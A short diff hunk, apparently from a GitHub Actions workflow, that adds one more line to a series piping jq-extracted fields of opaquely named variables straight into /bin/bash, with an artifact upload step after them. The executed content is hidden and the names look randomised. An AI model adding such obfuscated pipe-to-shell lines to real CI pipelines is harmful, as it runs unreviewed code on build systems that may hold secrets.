@@ -27,6 +27,7 @@ jobs:
           echo $mfv85503 | jq -r .zfa95928 | /bin/bash
           echo $pdtgj9 | jq -r .aon56 | /bin/bash
           printf '%s' "$jmeg8" | jq -r .yevvp3166 | /bin/bash
+          printf '%s' "$unlpt4" | jq -r .c305 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
